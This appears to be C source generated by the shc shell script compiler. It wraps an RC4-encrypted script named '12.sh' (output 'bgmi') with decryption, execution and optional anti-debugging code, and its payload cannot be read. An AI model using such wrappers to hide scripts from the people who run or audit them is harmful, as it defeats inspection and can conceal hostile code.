#if 0
	shc Version 4.0.3, Generic Shell Script Compiler
	GNU GPL Version 3 Md Jahidul Hamid <jahidulhamid@yahoo.com>

	shc -f 12.sh -o bgmi 
#endif

static  char data [] = 
#define      inlo_z	3
#define      inlo	((&data[0]))
	"\005\376\032"
#define      text_z	1882
#define      text	((&data[307]))
	"\212\273\101\131\315\333\136\224\227\323\144\147\357\337\135\334"
	"\303\170\015\371\040\150\132\042\110\251\145\122\173\012\273\006"
	"\305\374\137\223\330\275\050\160\221\214\330\201\153\065\136\057"
	"\255\153\051\316\324\203\360\035\055\125\157\250\137\053\257\045"
	"\050\016\270\000\314\341\161\135\155\111\337\331\177\075\010\054"
	"\250\061\372\175\264\353\232\341\100\011\212\240\065\071\305\135"
	"\110\176\135\024\137\317\162\315\030\121\246\227\216\256\304\067"
	"\340\277\264\224\252\117\166\353\131\001\213\216\073\121\353\203"
	"\320\111\230\060\030\012\375\060\134\243\310\353\122\215\043\063"
	"\114\330\310\367\047\076\342\200\100\156\016\173\300\372\377\220"
	"\103\227\301\133\242\276\214\377\142\125\353\265\342\016\350\057"
	"\347\260\047\016\357\011\217\057\170\236\253\070\230\252\311\333"
	"\102\212\067\344\110\304\343\253\031\316\140\374\335\110\054\304"
	"\371\123\323\350\135\142\030\325\000\304\016\230\156\327\164\260"
	"\141\254\225\252\160\171\126\212\110\266\206\045\377\262\352\371"
	"\006\275\341\143\037\372\070\040\276\106\271\055\036\055\336\200"
	"\331\163\053\112\355\201\324\065\070\133\133\070\016\105\061\024"
	"\003\023\167\043\016\260\103\314\367\375\372\026\053\330\226\004"
	"\114\301\117\072\103\043\157\173\176\313\264\214\021\346\241\024"
	"\361\162\135\205\232\221\025\341\150\022\162\127\306\144\266\354"
	"\064\047\163\276\254\054\174\260\136\211\002\107\162\101\124\173"
	"\316\103\046\061\005\046\205\166\225\374\165\155\300\355\022\123"
	"\302\131\205\353\301\047\031\224\214\075\204\055\112\046\262\275"
	"\001\036\336\251\122\215\054\366\337\215\022\164\014\024\025\005"
	"\312\317\130\112\215\246\060\173\157\056\251\010\062\007\206\030"
	"\226\023\351\012\230\372\064\305\266\000\277\051\151\154\017\150"
	"\367\001\312\115\304\207\357\111\256\342\204\342\315\066\110\146"
	"\157\173\344\127\115\120\231\155\143\364\132\174\364\151\054\223"
	"\172\275\075\327\376\142\040\050\201\325\212\066\322\256\067\224"
	"\346\041\034\360\304\365\054\164\214\045\057\233\263\261\354\011"
	"\244\361\337\235\034\300\351\162\146\202\015\207\216\246\337\247"
	"\006\023\140\223\065\372\144\116\047\344\270\343\124\207\146\210"
	"\235\121\253\261\014\315\076\217\255\071\315\106\221\101\270\104"
	"\165\101\207\205\371\344\323\011\054\267\031\332\266\123\067\224"
	"\100\224\070\064\147\125\040\113\141\372\202\002\172\030\171\023"
	"\203\132\150\147\266\123\103\045\017\201\144\165\055\146\146\012"
	"\077\017\075\011\151\214\071\157\147\357\124\011\155\170\133\052"
	"\072\364\303\164\122\321\325\167\351\171\125\002\314\126\365\005"
	"\313\111\362\032\000\347\205\142\222\017\152\077\057\240\215\130"
	"\247\314\316\271\345\162\364\332\206\341\120\337\371\115\036\326"
	"\335\325\277\302\060\321\057\204\103\007\343\175\062\105\372\250"
	"\243\147\247\126\355\003\236\162\076\304\260\337\132\307\231\314"
	"\255\152\365\002\025\073\323\314\166\114\325\305\023\072\216\172"
	"\050\043\004\241\307\345\224\303\300\334\347\062\162\062\022\266"
	"\147\056\300\220\344\057\254\130\223\206\124\015\373\247\357\062"
	"\055\345\156\117\307\157\366\044\117\133\355\135\371\035\045\312"
	"\040\271\164\175\115\133\301\171\202\267\320\133\316\171\231\310"
	"\204\172\315\203\024\142\265\103\174\060\345\263\315\306\001\106"
	"\067\352\342\341\140\207\362\216\012\034\143\366\031\057\043\032"
	"\220\030\321\050\011\133\260\062\106\301\036\272\065\167\002\351"
	"\102\004\220\064\067\074\116\154\001\275\303\045\372\147\326\176"
	"\011\326\353\216\353\230\326\167\357\173\076\036\177\061\215\236"
	"\226\377\023\250\340\031\014\106\225\117\061\020\111\255\161\156"
	"\352\146\107\057\063\374\172\357\104\351\306\176\103\150\370\336"
	"\225\275\275\066\152\113\041\233\377\130\075\067\345\003\373\240"
	"\337\316\335\075\004\211\161\334\201\356\215\267\222\355\204\042"
	"\230\044\166\357\112\054\213\073\244\236\077\262\041\132\063\102"
	"\231\265\126\052\001\163\126\056\205\103\340\147\345\347\227\017"
	"\202\271\274\210\377\045\213\345\166\016\132\141\047\012\014\047"
	"\105\035\314\006\000\236\070\017\131\345\360\240\023\330\333\160"
	"\120\362\157\301\234\250\205\140\252\206\204\234\262\156\275\232"
	"\271\026\306\021\067\136\222\306\043\037\014\302\153\335\371\057"
	"\110\043\113\352\130\206\256\120\260\171\034\326\243\315\140\004"
	"\352\075\115\066\123\010\327\016\036\061\313\334\175\050\004\045"
	"\102\140\334\236\102\100\314\204\373\162\311\123\300\205\055\052"
	"\355\101\034\071\354\314\167\360\236\076\050\371\205\361\135\350"
	"\155\300\211\115\345\212\242\372\372\154\016\206\230\210\061\363"
	"\373\362\035\054\176\021\227\152\357\272\335\221\135\277\136\274"
	"\215\245\162\025\036\315\333\021\160\114\001\234\137\276\357\320"
	"\346\242\107\277\374\337\344\137\160\212\275\022\261\177\314\327"
	"\271\367\336\262\374\306\305\121\220\117\231\027\203\335\151\113"
	"\331\274\307\316\142\156\236\360\230\343\376\366\015\035\243\044"
	"\141\301\061\316\214\020\365\031\302\120\000\031\315\277\360\224"
	"\264\224\061\255\343\356\045\050\203\134\315\014\304\234\274\005"
	"\325\145\120\047\002\117\215\034\132\153\310\020\313\377\276\367"
	"\045\343\005\336\366\361\176\176\276\337\333\375\007\256\131\327"
	"\220\142\351\022\352\343\303\074\154\063\270\046\357\164\261\246"
	"\231\234\214\024\150\264\344\251\024\360\202\331\006\341\075\146"
	"\014\207\072\013\050\144\064\210\275\373\074\045\251\361\004\265"
	"\331\062\311\307\065\203\100\331\236\206\232\271\337\116\162\062"
	"\067\044\332\261\156\230\101\271\335\303\052\107\171\011\206\237"
	"\144\176\307\037\337\217\277\047\101\113\162\245\023\267\174\116"
	"\242\253\077\261\201\073\160\271\146\164\211\275\310\350\131\342"
	"\155\302\321\116\245\331\335\215\135\071\171\207\264\276\002\154"
	"\004\034\331\326\161\130\256\122\210\067\061\045\022\254\014\140"
	"\134\263\145\331\076\107\232\032\114\236\071\111\121\202\160\207"
	"\333\252\300\047\233\150\352\075\051\031\341\266\161\214\027\062"
	"\310\023\345\376\001\362\075\026\304\001\365\237\164\236\100\164"
	"\203\165\300\004\314\121\130\266\053\165\154\327\132\034\211\236"
	"\167\307\321\256\023\220\270\004\120\136\300\233\241\377\143\063"
	"\017\045\235\266\304\120\202\022\221\042\024\212\327\133\344\030"
	"\173\131\203\261\231\332\350\212\142\070\257\362\304\217\173\347"
	"\106\324\365\273\126\151\365\070\322\365\136\015\125\172\273\343"
	"\222\121\225\272\136\172\310\203\002\331\071\237\167\314\220\074"
	"\050\043\255\113\350\020\155\300\301\226\121\116\251\270\147\011"
	"\342\011\270\207\046\102\301\026\137\166\366\215\277\107\026\032"
	"\076\045\170\337\147\364\005\165\143\155\164\351\140\260\245\054"
	"\135\123\237\220\326\246\031\016\141\210\103\164\012\375\240\225"
	"\315\205\056\173\113\354\013\075\137\024\204\373\057\323\173\310"
	"\005\074\160\127\333\251\344\034\033\144\047\002\164\127\016\241"
	"\045\104\076\323\227\073\131\216\162\014\213\251\027\254\346\110"
	"\265\211\023\042\133\315\300\250\074\313\332\312\210\070\155\371"
	"\255\113\161\156\265\155\306\075\341\356\341\034\051\204\044\221"
	"\150\243\105\036\315\235\146\026\134\151\204\153\126\202\132\310"
	"\054\362\365\136\355\304\341\000\225\344\261\061\057\346\076\125"
	"\132\165\312\245\342\206\257\075\205\277\136\144\052\005\053\077"
	"\172\045\065\022\245\325\334\332\322\017\272\375\053\321\074\354"
	"\023\136\072\364\043\071\364\343\020\126\310\205\003\063\116\376"
	"\343\276\113\270\071\371\063\016\117\134\112\006\365\101\375\242"
	"\346\140\004\312\274\102\255\223\353\031\014\271\255\312\216\006"
	"\357\252\362\354\024\330\176\146\314\141\314\243\004\371\113\100"
	"\266\332\205\130\056\110\115\247\107\165\272\122\161\061\312\134"
	"\376\300\207\145\206\257\115\026\216\376\035\132\055\145\323\271"
	"\260\371\254\330\314\037\021\141\077\337\301\271\374\030\337\202"
	"\266\267\263\212\123\143\073\156\311\013\254\127\142\155\151\013"
	"\373\160\213\330\243\333\011\205\076\357\273\264\260\161\261\232"
	"\134\245\237\172\123\332\331\276\361\352\322\256\063\174\037\130"
	"\112\323\210\134\373\253\215\201\201\041\262\161\206\262\174\012"
	"\117\305\365\155\037\306\203\014\161\140\063\112\211\013\372\114"
	"\045\033\231\317\122\222\020\274\253\164\131\266\204\226\350\164"
	"\375\326\051\035\360\161\250\047\375\272\177\160\323\141\141\236"
	"\045\312\272\176\222\232\230\257\231\377\277\000\276\205\271\060"
	"\243\056\047\353\263\057\207\120\057\043\076\174\317\176\316\102"
	"\233\240\320\026\047\171\250\243\173\260\153\322\171\257\247\375"
	"\310\374\041\033\112\150\327\217\134\356\265\231\267\200\367\026"
	"\316\305\256\227\045\143\206\317\065\240\030\322\152\136\101\171"
	"\010\025\332\216\011\032\114\123\150\106\021\220\273\340\234\152"
	"\306\313\124\035\141\064\300\104\304\307\223\142\052\272\336\244"
	"\165\353\362\163\355\074\244\233\275\025\336\244\217\102\126\262"
	"\067\046\153\055\374\263\306\307\216\114\352\215\306\116\251\211"
	"\320\157\070\251\327\346\075\131\245\277\077\120\325\127\305\036"
	"\215\365\041\366\253\363\002\044\207\003\040\365\265\002\371\034"
	"\373\224\255\125\214\103\272\031\355\002\303\022\101\303\337\047"
	"\110\033\321\135\135\047\132\223\360\135\345\222\113\022\034\124"
	"\214\353\237\010\305\227\032\227\030\143\073\337\165\271\260\054"
	"\044\164\330\166\121\372\340\324\342\321\134\177\332\325\362\324"
	"\043\223\165\157\354\222\023\205\246\355\371\031\070\007\311\174"
	"\324\301\171\317\327\244\247\155\251\364\057\370\056\163\034\236"
	"\357\232\152\243\047\173\211\311\220\203\342\310\213\253\104\137"
	"\154\275\057\104\142\327\261\013\313\341\003\372\124\040\231\103"
	"\272\003\346\342\177\160\253\017\363\216\327\176\071\034\336\246"
	"\332\015\352\074\344\234\110\260\176\114\253\322\154\104\026\047"
	"\107\375\011\307\155\265\326\141\103\256\337\175\313\276\044\245"
	"\314\017\342\261\253\052\142\051\166\015\374\342\121\022\011\231"
	"\017\023\140\175\311\067\336\015\345\276\213\260\174\257\126\111"
	"\276\070\372\152\142\134\224\331\152\221\273\274\243\305\125\263"
	"\330\266\060\242\356\016\257\324\314\073\204\111\352\333\222\251"
	"\023\214\024\166\351\250\117\123\071\013\020\335\320\145\220\251"
	"\034\300\114\012\317\373\336\234\067\143"
#define      tst2_z	19
#define      tst2	((&data[2381]))
	"\373\200\223\377\301\264\021\075\214\343\226\351\145\346\263\363"
	"\177\301\305\167"
#define      opts_z	1
#define      opts	((&data[2401]))
	"\004"
#define      chk2_z	19
#define      chk2	((&data[2405]))
	"\207\031\102\162\220\276\244\221\235\170\134\305\345\002\123\076"
	"\041\110\022\343\155\326\301\045\122\236"
#define      pswd_z	256
#define      pswd	((&data[2474]))
	"\237\325\360\353\340\277\347\277\133\036\042\100\100\142\270\013"
	"\265\274\352\176\252\162\230\355\063\275\077\322\263\367\001\123"
	"\314\361\076\254\261\046\153\014\105\216\115\205\360\006\040\131"
	"\112\007\002\135\351\105\070\074\207\240\306\226\237\377\307\273"
	"\346\170\353\026\033\375\307\223\376\010\070\334\155\130\065\270"
	"\140\070\025\111\176\116\206\005\356\115\233\216\114\142\112\062"
	"\332\066\111\366\063\020\212\062\030\302\017\206\033\104\077\173"
	"\175\124\305\373\242\113\000\221\230\234\040\344\377\152\027\332"
	"\240\140\320\324\161\132\007\212\035\026\021\070\133\120\263\330"
	"\244\171\324\107\304\324\331\135\161\371\102\160\144\131\112\005"
	"\272\032\331\053\164\341\265\221\370\306\312\123\027\176\054\274"
	"\367\000\004\274\325\335\031\106\327\133\266\073\265\000\100\157"
	"\032\032\233\217\373\120\041\364\027\354\107\057\152\164\353\141"
	"\164\357\035\111\314\067\217\243\223\106\337\110\106\037\270\141"
	"\072\123\361\066\244\022\052\273\376\162\353\151\346\326\312\133"
	"\305\350\244\222\040\064\066\263\172\026\374\300\066\264\042\160"
	"\010\023\246\254\046\321\150\044\103\123\215\052\051\130\205\357"
	"\101\051\202\142\136\270\025\331\316\022\232\004\307\274\165\317"
	"\317\034\173\365\355\343\032\060\066\250\132\140\001\340\221\246"
	"\302\174\045\155\356\275\132\042\173"
#define      msg2_z	19
#define      msg2	((&data[2745]))
	"\221\366\201\136\130\355\173\053\220\255\024\072\155\322\147\340"
	"\161\172\147\100\072\022\121"
#define      msg1_z	65
#define      msg1	((&data[2776]))
	"\231\347\167\246\054\006\364\261\367\372\103\235\131\305\302\202"
	"\074\075\374\207\014\007\325\176\312\305\027\227\047\031\135\327"
	"\306\255\040\245\263\066\047\044\134\325\125\051\102\240\321\055"
	"\017\043\125\132\024\007\023\260\202\263\003\341\243\110\167\377"
	"\112\365\335\142\036\335\257\074\142\255\166\006\034"
#define      date_z	1
#define      date	((&data[2841]))
	"\100"
#define      shll_z	10
#define      shll	((&data[2844]))
	"\205\320\252\275\142\113\160\245\220\063\212\001\373"
#define      xecc_z	15
#define      xecc	((&data[2858]))
	"\261\274\253\110\355\176\336\303\026\277\343\362\244\364\105\250"
	"\046\163"
#define      lsto_z	1
#define      lsto	((&data[2873]))
	"\350"
#define      tst1_z	22
#define      tst1	((&data[2875]))
	"\223\061\177\031\053\113\222\307\312\022\211\126\230\311\005\062"
	"\071\123\103\204\344\203\320\345"
#define      chk1_z	22
#define      chk1	((&data[2901]))
	"\061\220\324\153\123\336\002\141\242\136\070\042\066\271\020\344"
	"\311\006\162\126\302\337\375\026\035\165\055\222\064\357"
#define      rlax_z	1
#define      rlax	((&data[2928]))
	"\032"/* End of data[] */;
#define      hide_z	4096
#define SETUID 0	/* Define as 1 to call setuid(0) at start of script */
#define DEBUGEXEC	0	/* Define as 1 to debug execvp calls */
#define TRACEABLE	1	/* Define as 1 to enable ptrace the executable */
#define HARDENING	0	/* Define as 1 to disable ptrace/dump the executable */
#define BUSYBOXON	0	/* Define as 1 to enable work with busybox */

#if HARDENING
static const char * shc_x[] = {
"/*",
" * Copyright 2019 - Intika <intika@librefox.org>",
" * Replace ******** with secret read from fd 21",
" * Also change arguments location of sub commands (sh script commands)",
" * gcc -Wall -fpic -shared -o shc_secret.so shc_secret.c -ldl",
" */",
"",
"#define _GNU_SOURCE /* needed to get RTLD_NEXT defined in dlfcn.h */",
"#define PLACEHOLDER \"********\"",
"#include <dlfcn.h>",
"#include <stdlib.h>",
"#include <string.h>",
"#include <unistd.h>",
"#include <stdio.h>",
"#include <signal.h>",
"",
"static char secret[128000]; //max size",
"typedef int (*pfi)(int, char **, char **);",
"static pfi real_main;",
"",
"// copy argv to new location",
"char **copyargs(int argc, char** argv){",
"    char **newargv = malloc((argc+1)*sizeof(*argv));",
"    char *from,*to;",
"    int i,len;",
"",
"    for(i = 0; i<argc; i++){",
"        from = argv[i];",
"        len = strlen(from)+1;",
"        to = malloc(len);",
"        memcpy(to,from,len);",
"        // zap old argv space",
"        memset(from,'\\0',len);",
"        newargv[i] = to;",
"        argv[i] = 0;",
"    }",
"    newargv[argc] = 0;",
"    return newargv;",
"}",
"",
"static int mymain(int argc, char** argv, char** env) {",
"    //fprintf(stderr, \"Inject main argc = %d\\n\", argc);",
"    return real_main(argc, copyargs(argc,argv), env);",
"}",
"",
"int __libc_start_main(int (*main) (int, char**, char**),",
"                      int argc,",
"                      char **argv,",
"                      void (*init) (void),",
"                      void (*fini)(void),",
"                      void (*rtld_fini)(void),",
"                      void (*stack_end)){",
"    static int (*real___libc_start_main)() = NULL;",
"    int n;",
"",
"    if (!real___libc_start_main) {",
"        real___libc_start_main = dlsym(RTLD_NEXT, \"__libc_start_main\");",
"        if (!real___libc_start_main) abort();",
"    }",
"",
"    n = read(21, secret, sizeof(secret));",
"    if (n > 0) {",
"      int i;",
"",
"    if (secret[n - 1] == '\\n') secret[--n] = '\\0';",
"    for (i = 1; i < argc; i++)",
"        if (strcmp(argv[i], PLACEHOLDER) == 0)",
"          argv[i] = secret;",
"    }",
"",
"    real_main = main;",
"",
"    return real___libc_start_main(mymain, argc, argv, init, fini, rtld_fini, stack_end);",
"}",
"",
0};
#endif /* HARDENING */

/* rtc.c */

#include <sys/stat.h>
#include <sys/types.h>

#include <errno.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <time.h>
#include <unistd.h>

/* 'Alleged RC4' */

static unsigned char stte[256], indx, jndx, kndx;

/*
 * Reset arc4 stte. 
 */
void stte_0(void)
{
	indx = jndx = kndx = 0;
	do {
		stte[indx] = indx;
	} while (++indx);
}

/*
 * Set key. Can be used more than once. 
 */
void key(void * str, int len)
{
	unsigned char tmp, * ptr = (unsigned char *)str;
	while (len > 0) {
		do {
			tmp = stte[indx];
			kndx += tmp;
			kndx += ptr[(int)indx % len];
			stte[indx] = stte[kndx];
			stte[kndx] = tmp;
		} while (++indx);
		ptr += 256;
		len -= 256;
	}
}

/*
 * Crypt data. 
 */
void arc4(void * str, int len)
{
	unsigned char tmp, * ptr = (unsigned char *)str;
	while (len > 0) {
		indx++;
		tmp = stte[indx];
		jndx += tmp;
		stte[indx] = stte[jndx];
		stte[jndx] = tmp;
		tmp += stte[indx];
		*ptr ^= stte[tmp];
		ptr++;
		len--;
	}
}

/* End of ARC4 */

#if HARDENING

#include <sys/ptrace.h>
#include <sys/wait.h>
#include <signal.h>
#include <sys/prctl.h>
#define PR_SET_PTRACER 0x59616d61

/* Seccomp Sandboxing Init */
#include <stdlib.h>
#include <stdio.h>
#include <stddef.h>
#include <string.h>
#include <unistd.h>
#include <errno.h>

#include <sys/types.h>
#include <sys/prctl.h>
#include <sys/syscall.h>
#include <sys/socket.h>

#include <linux/filter.h>
#include <linux/seccomp.h>
#include <linux/audit.h>

#define ArchField offsetof(struct seccomp_data, arch)

#define Allow(syscall) \
    BPF_JUMP(BPF_JMP+BPF_JEQ+BPF_K, SYS_##syscall, 0, 1), \
    BPF_STMT(BPF_RET+BPF_K, SECCOMP_RET_ALLOW)

struct sock_filter filter[] = {
    /* validate arch */
    BPF_STMT(BPF_LD+BPF_W+BPF_ABS, ArchField),
    BPF_JUMP( BPF_JMP+BPF_JEQ+BPF_K, AUDIT_ARCH_X86_64, 1, 0),
    BPF_STMT(BPF_RET+BPF_K, SECCOMP_RET_KILL),

    /* load syscall */
    BPF_STMT(BPF_LD+BPF_W+BPF_ABS, offsetof(struct seccomp_data, nr)),

    /* list of allowed syscalls */
    Allow(exit_group),  /* exits a process */
    Allow(brk),         /* for malloc(), inside libc */
    Allow(mmap),        /* also for malloc() */
    Allow(munmap),      /* for free(), inside libc */

    /* and if we don't match above, die */
    BPF_STMT(BPF_RET+BPF_K, SECCOMP_RET_KILL),
};
struct sock_fprog filterprog = {
    .len = sizeof(filter)/sizeof(filter[0]),
    .filter = filter
};

/* Seccomp Sandboxing - Set up the restricted environment */
void seccomp_hardening() {
    if (prctl(PR_SET_NO_NEW_PRIVS, 1, 0, 0, 0)) {
        perror("Could not start seccomp:");
        exit(1);
    }
    if (prctl(PR_SET_SECCOMP, SECCOMP_MODE_FILTER, &filterprog) == -1) {
        perror("Could not start seccomp:");
        exit(1);
    }
} 
/* End Seccomp Sandboxing Init */

void shc_x_file() {
    FILE *fp;
    int line = 0;

    if ((fp = fopen("/tmp/shc_x.c", "w")) == NULL ) {exit(1); exit(1);}
    for (line = 0; shc_x[line]; line++)	fprintf(fp, "%s\n", shc_x[line]);
    fflush(fp);fclose(fp);
}

int make() {
	char * cc, * cflags, * ldflags;
    char cmd[4096];

	cc = getenv("CC");
	if (!cc) cc = "cc";

	sprintf(cmd, "%s %s -o %s %s", cc, "-Wall -fpic -shared", "/tmp/shc_x.so", "/tmp/shc_x.c -ldl");
	if (system(cmd)) {remove("/tmp/shc_x.c"); return -1;}
	remove("/tmp/shc_x.c"); return 0;
}

void arc4_hardrun(void * str, int len) {
    //Decode locally
    char tmp2[len];
    char tmp3[len+1024];
    memcpy(tmp2, str, len);

	unsigned char tmp, * ptr = (unsigned char *)tmp2;
    int lentmp = len;
    int pid, status;
    pid = fork();

    shc_x_file();
    if (make()) {exit(1);}

    setenv("LD_PRELOAD","/tmp/shc_x.so",1);

    if(pid==0) {

        //Start tracing to protect from dump & trace
        if (ptrace(PTRACE_TRACEME, 0, 0, 0) < 0) {
            kill(getpid(), SIGKILL);
            _exit(1);
        }

        //Decode Bash
        while (len > 0) {
            indx++;
            tmp = stte[indx];
            jndx += tmp;
            stte[indx] = stte[jndx];
            stte[jndx] = tmp;
            tmp += stte[indx];
            *ptr ^= stte[tmp];
            ptr++;
            len--;
        }

        //Do the magic
        sprintf(tmp3, "%s %s", "'********' 21<<<", tmp2);

        //Exec bash script //fork execl with 'sh -c'
        system(tmp2);

        //Empty script variable
        memcpy(tmp2, str, lentmp);

        //Clean temp
        remove("/tmp/shc_x.so");

        //Sinal to detach ptrace
        ptrace(PTRACE_DETACH, 0, 0, 0);
        exit(0);
    }
    else {wait(&status);}

    /* Seccomp Sandboxing - Start */
    seccomp_hardening();

    exit(0);
}
#endif /* HARDENING */

/*
 * Key with file invariants. 
 */
int key_with_file(char * file)
{
	struct stat statf[1];
	struct stat control[1];

	if (stat(file, statf) < 0)
		return -1;

	/* Turn on stable fields */
	memset(control, 0, sizeof(control));
	control->st_ino = statf->st_ino;
	control->st_dev = statf->st_dev;
	control->st_rdev = statf->st_rdev;
	control->st_uid = statf->st_uid;
	control->st_gid = statf->st_gid;
	control->st_size = statf->st_size;
	control->st_mtime = statf->st_mtime;
	control->st_ctime = statf->st_ctime;
	key(control, sizeof(control));
	return 0;
}

#if DEBUGEXEC
void debugexec(char * sh11, int argc, char ** argv)
{
	int i;
	fprintf(stderr, "shll=%s\n", sh11 ? sh11 : "<null>");
	fprintf(stderr, "argc=%d\n", argc);
	if (!argv) {
		fprintf(stderr, "argv=<null>\n");
	} else { 
		for (i = 0; i <= argc ; i++)
			fprintf(stderr, "argv[%d]=%.60s\n", i, argv[i] ? argv[i] : "<null>");
	}
}
#endif /* DEBUGEXEC */

void rmarg(char ** argv, char * arg)
{
	for (; argv && *argv && *argv != arg; argv++);
	for (; argv && *argv; argv++)
		*argv = argv[1];
}

void chkenv_end(void);

int chkenv(int argc)
{
	char buff[512];
	unsigned long mask, m;
	int l, a, c;
	char * string;
	extern char ** environ;

	mask = (unsigned long)getpid();
	stte_0();
	 key(&chkenv, (void*)&chkenv_end - (void*)&chkenv);
	 key(&data, sizeof(data));
	 key(&mask, sizeof(mask));
	arc4(&mask, sizeof(mask));
	sprintf(buff, "x%lx", mask);
	string = getenv(buff);
#if DEBUGEXEC
	fprintf(stderr, "getenv(%s)=%s\n", buff, string ? string : "<null>");
#endif
	l = strlen(buff);
	if (!string) {
		/* 1st */
		sprintf(&buff[l], "=%lu %d", mask, argc);
		putenv(strdup(buff));
		return 0;
	}
	c = sscanf(string, "%lu %d%c", &m, &a, buff);
	if (c == 2 && m == mask) {
		/* 3rd */
		rmarg(environ, &string[-l - 1]);
		return 1 + (argc - a);
	}
	return -1;
}

void chkenv_end(void){}

#if HARDENING

static void gets_process_name(const pid_t pid, char * name) {
	char procfile[BUFSIZ];
	sprintf(procfile, "/proc/%d/cmdline", pid);
	FILE* f = fopen(procfile, "r");
	if (f) {
		size_t size;
		size = fread(name, sizeof (char), sizeof (procfile), f);
		if (size > 0) {
			if ('\n' == name[size - 1])
				name[size - 1] = '\0';
		}
		fclose(f);
	}
}

void hardening() {
    prctl(PR_SET_DUMPABLE, 0);
    prctl(PR_SET_PTRACER, -1);

    int pid = getppid();
    char name[256] = {0};
    gets_process_name(pid, name);

    if (   (strcmp(name, "bash") != 0) 
        && (strcmp(name, "/bin/bash") != 0) 
        && (strcmp(name, "sh") != 0) 
        && (strcmp(name, "/bin/sh") != 0) 
        && (strcmp(name, "sudo") != 0) 
        && (strcmp(name, "/bin/sudo") != 0) 
        && (strcmp(name, "/usr/bin/sudo") != 0)
        && (strcmp(name, "gksudo") != 0) 
        && (strcmp(name, "/bin/gksudo") != 0) 
        && (strcmp(name, "/usr/bin/gksudo") != 0) 
        && (strcmp(name, "kdesu") != 0) 
        && (strcmp(name, "/bin/kdesu") != 0) 
        && (strcmp(name, "/usr/bin/kdesu") != 0) 
       )
    {
        printf("Operation not permitted\n");
        kill(getpid(), SIGKILL);
        exit(1);
    }
}

#endif /* HARDENING */

#if !TRACEABLE

#define _LINUX_SOURCE_COMPAT
#include <sys/ptrace.h>
#include <sys/types.h>
#include <sys/wait.h>
#include <fcntl.h>
#include <signal.h>
#include <stdio.h>
#include <unistd.h>

#if !defined(PT_ATTACHEXC) /* New replacement for PT_ATTACH */
   #if !defined(PTRACE_ATTACH) && defined(PT_ATTACH)
       #define PT_ATTACHEXC	PT_ATTACH
   #elif defined(PTRACE_ATTACH)
       #define PT_ATTACHEXC PTRACE_ATTACH
   #endif
#endif

void untraceable(char * argv0)
{
	char proc[80];
	int pid, mine;

	switch(pid = fork()) {
	case  0:
		pid = getppid();
		/* For problematic SunOS ptrace */
#if defined(__FreeBSD__)
		sprintf(proc, "/proc/%d/mem", (int)pid);
#else
		sprintf(proc, "/proc/%d/as",  (int)pid);
#endif
		close(0);
		mine = !open(proc, O_RDWR|O_EXCL);
		if (!mine && errno != EBUSY)
			mine = !ptrace(PT_ATTACHEXC, pid, 0, 0);
		if (mine) {
			kill(pid, SIGCONT);
		} else {
			perror(argv0);
			kill(pid, SIGKILL);
		}
		_exit(mine);
	case -1:
		break;
	default:
		if (pid == waitpid(pid, 0, 0))
			return;
	}
	perror(argv0);
	_exit(1);
}
#endif /* !TRACEABLE */

char * xsh(int argc, char ** argv)
{
	char * scrpt;
	int ret, i, j;
	char ** varg;
	char * me = argv[0];
	if (me == NULL) { me = getenv("_"); }
	if (me == 0) { fprintf(stderr, "E: neither argv[0] nor $_ works."); exit(1); }

	ret = chkenv(argc);
	stte_0();
	 key(pswd, pswd_z);
	arc4(msg1, msg1_z);
	arc4(date, date_z);
	if (date[0] && (atoll(date)<time(NULL)))
		return msg1;
	arc4(shll, shll_z);
	arc4(inlo, inlo_z);
	arc4(xecc, xecc_z);
	arc4(lsto, lsto_z);
	arc4(tst1, tst1_z);
	 key(tst1, tst1_z);
	arc4(chk1, chk1_z);
	if ((chk1_z != tst1_z) || memcmp(tst1, chk1, tst1_z))
		return tst1;
	arc4(msg2, msg2_z);
	if (ret < 0)
		return msg2;
	varg = (char **)calloc(argc + 10, sizeof(char *));
	if (!varg)
		return 0;
	if (ret) {
		arc4(rlax, rlax_z);
		if (!rlax[0] && key_with_file(shll))
			return shll;
		arc4(opts, opts_z);
#if HARDENING
	    arc4_hardrun(text, text_z);
	    exit(0);
       /* Seccomp Sandboxing - Start */
       seccomp_hardening();
#endif
		arc4(text, text_z);
		arc4(tst2, tst2_z);
		 key(tst2, tst2_z);
		arc4(chk2, chk2_z);
		if ((chk2_z != tst2_z) || memcmp(tst2, chk2, tst2_z))
			return tst2;
		/* Prepend hide_z spaces to script text to hide it. */
		scrpt = malloc(hide_z + text_z);
		if (!scrpt)
			return 0;
		memset(scrpt, (int) ' ', hide_z);
		memcpy(&scrpt[hide_z], text, text_z);
	} else {			/* Reexecute */
		if (*xecc) {
			scrpt = malloc(512);
			if (!scrpt)
				return 0;
			sprintf(scrpt, xecc, me);
		} else {
			scrpt = me;
		}
	}
	j = 0;
#if BUSYBOXON
	varg[j++] = "busybox";
	varg[j++] = "sh";
#else
	varg[j++] = argv[0];		/* My own name at execution */
#endif
	if (ret && *opts)
		varg[j++] = opts;	/* Options on 1st line of code */
	if (*inlo)
		varg[j++] = inlo;	/* Option introducing inline code */
	varg[j++] = scrpt;		/* The script itself */
	if (*lsto)
		varg[j++] = lsto;	/* Option meaning last option */
	i = (ret > 1) ? ret : 0;	/* Args numbering correction */
	while (i < argc)
		varg[j++] = argv[i++];	/* Main run-time arguments */
	varg[j] = 0;			/* NULL terminated array */
#if DEBUGEXEC
	debugexec(shll, j, varg);
#endif
	execvp(shll, varg);
	return shll;
}

int main(int argc, char ** argv)
{
#if SETUID
   setuid(0);
#endif
#if DEBUGEXEC
	debugexec("main", argc, argv);
#endif
#if HARDENING
	hardening();
#endif
#if !TRACEABLE
	untraceable(argv[0]);
#endif
	argv[1] = xsh(argc, argv);
	fprintf(stderr, "%s%s%s: %s\n", argv[0],
		errno ? ": " : "",
		errno ? strerror(errno) : "",
		argv[1] ? argv[1] : "<null>"
	);
	return 1;
}
